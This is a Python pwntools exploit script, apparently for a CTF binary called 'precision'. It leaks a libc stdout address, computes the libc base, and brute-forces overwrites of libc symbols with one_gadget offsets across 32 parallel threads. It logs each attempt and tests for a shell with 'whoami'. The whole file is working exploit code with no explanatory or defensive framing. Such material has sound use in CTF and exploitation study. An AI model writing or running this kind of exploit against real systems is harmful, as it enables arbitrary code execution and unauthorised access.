from pwn import *
import threading
import time
import concurrent.futures
import subprocess

# Set up binary and libc
context.binary = './precision'
libc = ELF('./libc.so.6')

# Lock for logging (to ensure thread-safe writes)
log_lock = threading.Lock()

def mylog(identifier, message):
    """
    Custom logger: prepends a timestamp and writes to both a log file and stdout.
    The identifier contains the candidate symbol and gadget offset.
    """
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    line = f"[{timestamp}] {identifier}: {message}\n"
    with log_lock:
        with open("exploit9.log", "a") as f:
            f.write(line)
    print(line, end="")

def attempt_exploit(sym, sym_addr, gadget_offset):
    """
    Performs one exploit attempt.
      - sym: libc symbol name
      - sym_addr: libc symbol address offset
      - gadget_offset: candidate one_gadget offset
    The function:
      1. Launches the target process.
      2. Leaks stdout and computes libc_base.
      3. Computes overwrite_func and candidate_gadget.
      4. Sends payloads.
      5. Waits 5 seconds for process termination using p.wait(timeout=5).
         - If process exits before timeout, logs the exit code.
         - If timeout occurs and the process is still running, it tests interactive mode by sending "whoami".
      6. Logs all outcomes using mylog() with a unique identifier.
    """
    identifier = f"{sym}:{hex(sym_addr)} | gadget:{hex(gadget_offset)}"
    success = False
    try:
        p = process('./precision')
        mylog(identifier, "Process started")
        
        # Leak stdout address
        p.recvuntil(b'Coordinates: ')
        leaked_line = p.recvline().strip()
        stdout_addr = int(leaked_line, 16)
        libc_base = stdout_addr - libc.symbols['_IO_2_1_stdout_']
        mylog(identifier, f"Leaked stdout_addr: {hex(stdout_addr)}, computed libc_base: {hex(libc_base)}")
        
        # Calculate critical addresses based on candidate
        overwrite_func = libc_base + sym_addr
        candidate_gadget = libc_base + gadget_offset
        mylog(identifier, f"Calculated overwrite_func: {hex(overwrite_func)}, candidate_gadget: {hex(candidate_gadget)}")
        
        # Send first payload
        p.sendlineafter(b'>> ', str(overwrite_func).encode())
        p.send(p64(candidate_gadget))
        mylog(identifier, "Sent first payload")
        
        # Send second payload
        p.sendlineafter(b'>> ', b'')
        p.send(b'')
        mylog(identifier, "Sent second payload; now waiting for process response")
        
        # Wait for 5 seconds; if the process hasn't exited, test interactive functionality
        start_time = time.time()
        try:
            p.wait(timeout=5)
        except TimeoutError:
            elapsed = time.time() - start_time
            if p.proc.returncode is None:
                mylog(identifier, f"Process still running after {elapsed:.2f}s, testing interactive mode")
                try:
                    p.sendline(b"whoami")
                    response = p.recvline(timeout=3)
                    if b"kali" in response:
                        mylog(identifier, "Success (interactive output 'kali')")
                        success = True
                    elif response:
                        mylog(identifier, f"Unexpected interactive output: {response.strip()}")
                        success = False
                    else:
                        mylog(identifier, "No reply to 'whoami' command in interactive mode")
                        success = False
                except Exception as e:
                    mylog(identifier, f"Error during interactive test: {e}")
                    success = False
            else:
                ret_code = p.proc.returncode
                mylog(identifier, f"Process exit code after timeout: {ret_code}")
                success = False
        else:
            # Process exited before timeout
            elapsed = time.time() - start_time
            ret_code = p.proc.returncode
            if ret_code == 57:
                mylog(identifier, f"Failed (exit code 57 after {elapsed:.2f}s)")
                success = False
            elif ret_code == 139:
                mylog(identifier, f"Success (SIGSEGV after {elapsed:.2f}s)")
                success = True
            elif ret_code is None:
                mylog(identifier, f"Process still running after {elapsed:.2f}s, testing interactive mode")
                try:
                    p.sendline(b"whoami")
                    response = p.recvline(timeout=3)
                    if b"kali" in response:
                        mylog(identifier, "Success (interactive output 'kali')")
                        success = True
                    elif response:
                        mylog(identifier, f"Unexpected interactive output: {response.strip()}")
                        success = False
                    else:
                        mylog(identifier, "No reply to 'whoami' command in interactive mode")
                        success = False
                except Exception as e:
                    mylog(identifier, f"Error during interactive test: {e}")
                    success = False
            else:
                mylog(identifier, f"Success (exit code {ret_code} after {elapsed:.2f}s)")
                success = True
    except Exception as e:
        mylog(identifier, f"Exception occurred: {str(e)}")
    finally:
        try:
            p.close()
        except Exception:
            pass

def main():
    # Candidate one_gadget offsets
    candidate_gadget_offsets = [0xebcf1, 0xebcf5, 0xebcf8, 0xebd52, 0xebda8, 0xebdaf, 0xebdb3]
    
    # Use ThreadPoolExecutor to run attempts in parallel (max 32 threads)
    with concurrent.futures.ThreadPoolExecutor(max_workers=32) as executor:
        futures = []
        for sym, sym_addr in libc.symbols.items():
            for gadget_offset in candidate_gadget_offsets:
                futures.append(executor.submit(attempt_exploit, sym, sym_addr, gadget_offset))
        # Optionally, wait for all attempts to finish
        for future in concurrent.futures.as_completed(futures):
            pass

if __name__ == '__main__':
    main()
